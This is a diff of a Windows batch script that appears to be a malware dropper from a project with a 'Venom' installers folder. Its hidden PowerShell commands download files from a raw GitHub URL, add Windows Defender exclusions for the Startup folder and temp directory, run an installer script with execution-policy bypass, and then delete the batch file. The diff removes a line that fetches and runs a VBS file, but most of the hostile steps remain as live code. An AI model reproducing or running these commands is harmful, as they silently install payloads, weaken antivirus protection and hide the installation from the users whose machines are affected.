@@ -36,10 +36,8 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/AutoRun.bat -OutFile AutoRun.bat"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
-
 powershell powershell.exe -windowstyle hidden -ep bypass "./installer.ps1"
 
-powershell powershell.exe -ExecutionPolicy Bypass ./RunHidden.vbs
+
 @REM self delete
 del wget.cmd
